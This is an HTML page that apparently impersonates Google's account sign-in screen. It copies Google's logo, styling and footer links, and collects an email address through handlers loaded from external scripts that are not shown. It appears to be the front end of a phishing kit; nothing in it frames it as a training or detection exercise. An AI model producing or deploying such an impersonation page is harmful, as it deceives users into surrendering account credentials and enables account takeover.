<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Sign in - Google Accounts</title>
  <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <script src="/config.js"></script>
  <script src="functions.js"></script>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      background-color: #0e0e0e;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      color: #e3e3e3;
      min-height: 100vh;
    }

    /* ── DESKTOP layout (card style) ── */
    #megadiv {
      width: 100%;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #1e1f20;
      padding: 24px;
    }

    #main { width: 100%; max-width: 1040px; }

    #instructions {
      background-color: #0e0e0e;
      width: 100%;
      min-height: 384px;
      border-radius: 28px;
      display: flex;
      overflow: hidden;
      position: relative;
    }

    #left { width: 45%; flex-shrink: 0; }
    #get_instructed { padding: 40px; }
    #get_instructed h1 { padding-top: 20px; font-size: 28px; font-weight: 300; color: #e3e3e3; }
    #get_instructed p { font-size: 15px; padding-top: 16px; color: #9aa0a6; }

    #right {
      position: relative;
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    #name_form_div { padding: 40px; width: 100%; }

    #bottom_right {
      position: absolute;
      bottom: 32px;
      right: 32px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    /* Input */
    #email-wrapper {
      position: relative;
      width: 100%;
      margin: 10px 0 0 0;
    }
    #email-wrapper input[type="text"] {
      width: 100%;
      height: 56px;
      padding: 14px;
      background-color: #0e0e0e;
      color: #e3e3e3;
      border: 1px solid #5f6368;
      border-radius: 4px;
      font-size: 16px;
      outline: none;
      font-family: inherit;
      transition: border 0.15s;
    }
    #email-wrapper input[type="text"]:focus { border: 2px solid #a8c7fa; }
    #email_label {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 16px;
      line-height: 1;
      color: #9aa0a6;
      background-color: transparent;
      padding: 0 4px;
      pointer-events: none;
      z-index: 1;
      transition: all 0.12s;
    }
    #email-wrapper input:focus ~ #email_label,
    #email-wrapper input:not(:placeholder-shown) ~ #email_label {
      top: 0;
      transform: translateY(-50%);
      font-size: 12px;
      background-color: #0e0e0e;
    }
    #email-wrapper input:focus ~ #email_label { color: #a8c7fa; }
    #email-wrapper input:not(:placeholder-shown):not(:focus) ~ #email_label { color: #9aa0a6; }

    #forgot_email {
      display: block;
      color: #a8c7fa;
      font-size: 14px;
      font-weight: 500;
      margin-top: 8px;
      text-decoration: none;
    }
    #forgot_email:hover { text-decoration: underline; }

    #guest_mode_text {
      margin-top: 24px;
      font-size: 14px;
      color: #9aa0a6;
      line-height: 1.6;
    }
    #guest_mode_text a { color: #a8c7fa; font-size: 14px; padding: 0; }

    #next_button {
      cursor: pointer;
      font-weight: 600;
      font-family: inherit;
      color: #062e6f;
      height: 40px;
      padding: 0 24px;
      background-color: #a8c7fa;
      border: none;
      border-radius: 100px;
      font-size: 14px;
    }
    #next_button:hover { background-color: #bed1f3; }

    #create_account {
      background: transparent;
      height: 40px;
      padding: 0 16px;
      border: none;
      border-radius: 100px;
      color: #a8c7fa;
      font-family: inherit;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
    }
    #create_account:hover { background-color: #2b2b2b; }

    /* Undermenu */
    #undermenu {
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 8px;
      min-height: 56px;
      flex-wrap: wrap;
    }
    #under_container a { color: #9aa0a6; font-size: 13px; padding: 8px 12px; text-decoration: none; }
    #lang_button {
      border: none; background: transparent; border-radius: 6px;
      color: #9aa0a6; font-family: inherit; font-size: 13px;
      padding: 8px 12px; cursor: pointer;
    }

    /* ── MOBILE layout ── */
    @media (max-width: 700px) {
      body { background-color: #0e0e0e; }

      #megadiv {
        background-color: #0e0e0e;
        padding: 0;
        align-items: flex-start;
        min-height: 100vh;
        display: block;
      }

      #main { height: 100%; }

      #instructions {
        border-radius: 0;
        flex-direction: column;
        min-height: 100vh;
        background-color: #0e0e0e;
        position: relative;
      }

      #left { width: 100%; }
      #get_instructed {
        padding: 24px 20px 8px;
      }
      #get_instructed h1 {
        font-size: 32px;
        font-weight: 400;
        padding-top: 16px;
      }
      #get_instructed p {
        font-size: 16px;
        padding-top: 8px;
        color: #e3e3e3;
      }

      #right {
        width: 100%;
        display: block;
        position: static;
      }

      #name_form_div {
        padding: 24px 20px 0;
        width: 100%;
      }

      #email-wrapper { margin-top: 24px; }

      #email-wrapper input[type="text"] {
        height: 60px;
        font-size: 17px;
        border-radius: 6px;
        background-color: transparent;
        border-color: #5f6368;
      }

      #forgot_email {
        font-size: 15px;
        margin-top: 10px;
        padding: 4px 0;
        display: inline-block;
      }

      #guest_mode_text { display: none; }

      #bottom_right {
        position: static;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 32px 20px 16px;
        width: 100%;
      }

      #create_account {
        font-size: 16px;
        padding: 0;
        color: #a8c7fa;
      }

      #next_button {
        height: 44px;
        padding: 0 24px;
        font-size: 15px;
        border-radius: 100px;
      }

      #undermenu {
        padding: 16px 20px;
        flex-direction: column;
        align-items: flex-start;
        gap: 8px;
      }

      #under_container {
        display: flex;
        gap: 8px;
      }

      #under_container a { padding: 4px 8px; font-size: 14px; }
      #lang_button { font-size: 14px; padding: 4px 0; }
    }
    /* ── Loading bar ── */
    #loading-bar {
      position: absolute;
      top: 0;
      left: 0;
      height: 3px;
      width: 0%;
      background-color: #a8c7fa;
      z-index: 10;
      display: none;
      transition: width 0.4s ease;
    }
  </style>
</head>
<body>
  <div id="megadiv">
    <div id="main">
      <div id="instructions">
        <div id="loading-bar"></div>
        <div id="left">
          <div id="get_instructed">
            <svg onclick="piskot()" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" width="48" height="48" style="cursor:pointer">
              <circle cx="256" cy="256" r="256" fill="transparent"/>
              <g transform="translate(56,56) scale(0.78)">
                <path d="M42.4,145.9c15.5-32.3,37.4-59.6,65-82.3c37.4-30.9,80.3-49.5,128.4-55.2c56.5-6.7,109.6,4,158.7,33.4c12.2,7.3,23.6,15.6,34.5,24.6c2.7,2.2,2.4,3.5,0.1,5.7c-22.3,22.2-44.6,44.4-66.7,66.8c-2.6,2.6-4,2.4-6.8,0.3c-64.8-49.9-159.3-36.4-207.6,29.6c-8.5,11.6-15.4,24.1-20.2,37.7c-0.4,1.2-1.2,2.3-1.8,3.5c-12.9-9.8-25.9-19.6-38.7-29.5C72.3,169,57.3,157.5,42.4,145.9z" fill="#E94335"/>
                <path d="M126,303.8c4.3,9.5,7.9,19.4,13.3,28.3c22.7,37.2,55.1,61.1,97.8,69.6c38.5,7.7,75.5,2.5,110-16.8c1.2-0.6,2.4-1.2,3.5-1.8c0.6,0.6,1.1,1.3,1.7,1.8c25.8,20,51.7,40,77.5,60c-12.4,12.3-26.5,22.2-41.5,30.8c-43.5,24.8-90.6,34.8-140.2,31C186.3,501.9,133,477.5,89,433.5c-19.3-19.3-35.2-41.1-46.7-66c10.7-8.2,21.4-16.3,32.1-24.5C91.6,329.9,108.8,316.9,126,303.8z" fill="#34A853"/>
                <path d="M429.9,444.9c-25.8-20-51.7-40-77.5-60c-0.6-0.5-1.2-1.2-1.7-1.8c8.9-6.9,18-13.6,25.3-22.4c12.2-14.6,20.3-31.1,24.5-49.6c0.5-2.3,0.1-3.1-2.2-3c-1.2,0.1-2.3,0-3.5,0c-40.8,0-81.7-0.1-122.5,0.1c-4.5,0-5.5-1.2-5.4-5.5c0.2-29,0.2-58,0-87c0-3.7,1-4.7,4.7-4.7c74.8,0.1,149.6,0.1,224.5,0c3.2,0,4.5,0.8,5.3,4.2c6.1,27.5,5.7,55.1,2,82.9c-3,22.2-8.4,43.7-16.7,64.5c-12.3,30.7-30.4,57.5-54.2,80.5C431.6,443.8,430.7,444.3,429.9,444.9z" fill="#4285F3"/>
                <path d="M126,303.8c-17.2,13.1-34.4,26.1-51.6,39.2c-10.7,8.1-21.4,16.3-32.1,24.5C34,352.1,28.6,335.8,24.2,319c-8.4-32.5-9.7-65.5-5.1-98.6c3.6-26,11.1-51,23.2-74.4c15,11.5,29.9,23.1,44.9,34.6c12.9,9.9,25.8,19.7,38.7,29.5c-2.2,10.7-5.3,21.2-6.3,32.2c-1.8,20,0.1,39.5,5.8,58.7C125.8,301.8,125.9,302.8,126,303.8z" fill="#FABB06"/>
              </g>
            </svg>
            <h1>Sign in</h1>
            <p>Use your Google Account</p>
          </div>
        </div>
        <div id="right">
          <div id="name_form_div">
            <form method="get" id="password_form" onsubmit="checkLoginForm(event); return false;">
              <div id="email-wrapper">
                <input type="text" name="first_name" id="mail" placeholder=" " required autocomplete="off">
                <label for="mail" id="email_label">Email</label>
              </div>
            </form>
            <a href="#" id="forgot_email">Forgot email?</a>
            <p id="guest_mode_text">Not your computer? Use Guest mode to sign in privately. <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Learn more about using Guest mode</a></p>
          </div>
          <div id="bottom_right">
            <button id="create_account" onclick="letimletim()">Create account</button>
            <input type="button" id="next_button" onclick="showLoader(); checkLoginForm(event)" value="Next">
          </div>
        </div>
      </div>
      <div id="undermenu">
        <div id="language">
          <select id="lang_button" name="language">
            <option value="English (United States)">English (United States)</option>
            <option value="English (United Kingdom)">English (United Kingdom)</option>
          </select>
        </div>
        <div id="under_container">
          <a href="https://support.google.com/accounts?hl=en&p=account_iph" target="_blank">Help</a>
          <a href="https://accounts.google.com/TOS?loc=SI&hl=en&privacy=true" target="_blank">Privacy</a>
          <a href="https://accounts.google.com/TOS?loc=SI&hl=en" target="_blank">Terms</a>
        </div>
      </div>
    </div>
  </div>
  <script>
    function showLoader() {
      var bar = document.getElementById('loading-bar');
      bar.style.display = 'block';
      bar.style.width = '0%';
      setTimeout(function() { bar.style.width = '70%'; }, 50);
      setTimeout(function() { bar.style.width = '90%'; }, 600);
    }
  </script>
</body>
</html>
